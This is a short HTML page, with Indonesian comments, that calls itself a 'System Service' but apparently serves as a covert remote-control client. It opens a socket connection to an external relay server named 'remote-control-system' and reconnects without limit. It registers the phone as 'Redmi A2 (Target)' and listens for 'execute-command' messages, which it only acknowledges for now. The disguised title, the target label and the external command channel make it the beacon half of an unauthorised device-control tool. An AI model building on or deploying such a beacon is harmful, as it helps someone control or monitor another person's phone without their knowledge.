<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>System Service</title>
</head>
<body>
    <h2>System Service Background</h2>
    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        // Ganti dengan URL server relay Anda dari Render
        const SERVER_URL = 'https://remote-control-system-s4jf.onrender.com/';
        const DEVICE_ID = 'REDMI_A2_ZEEO';
        const DEVICE_NAME = 'Redmi A2 (Target)';

        const socket = io(SERVER_URL, {
            reconnection: true,
            reconnectionAttempts: Infinity,
            reconnectionDelay: 5000
        });

        socket.on('connect', () => {
            socket.emit('register-device', { deviceId: DEVICE_ID, deviceName: DEVICE_NAME });
        });

        socket.on('execute-command', (data) => {
            socket.emit('device-response', {
                deviceId: DEVICE_ID,
                message: `Aksi ${data.action} berhasil diterima di HP target.`
            });
        });
    </script>
</body>
</html>
